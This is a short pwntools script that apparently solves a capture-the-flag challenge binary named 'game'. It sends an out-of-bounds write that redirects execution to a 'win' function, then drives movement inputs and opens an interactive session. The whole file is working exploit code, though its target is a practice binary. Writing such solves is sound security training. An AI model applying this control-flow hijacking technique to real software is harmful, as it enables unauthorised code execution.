#!/bin/python3
from pwn import *

##################
# PWNTOOLS SETUP #
##################
context.terminal = "kitty"
# context.terminal = 'wt.exe wsl -d Ubuntu'.split()

binary = context.binary = ELF("./game")

host = args.HOST or "localhost"
port = int(args.PORT or 25565)

if args.LOCAL:
    if args.GDBSCRIPT:
        io: tube = gdb.debug(binary.path, gdbscript=args.GDBSCRIPT)
    else:
        io: tube = process(binary.path)
else:
    io: tube = remote(host, port)

###########
# EXPLOIT #
###########
START_X = START_Y = 4
TARGET_X = 0x5a - 0x27
TARGET_Y = -1
BYTE = p8(binary.symbols["win"] + 0x4 & 0xFF) # Skip all the push stuff because it will unalign stack

io.sendline(b"l" + BYTE)

io.sendline(b"d" * (TARGET_X - START_X))
io.sendline(b"w" * (START_Y - TARGET_Y))

io.interactive()
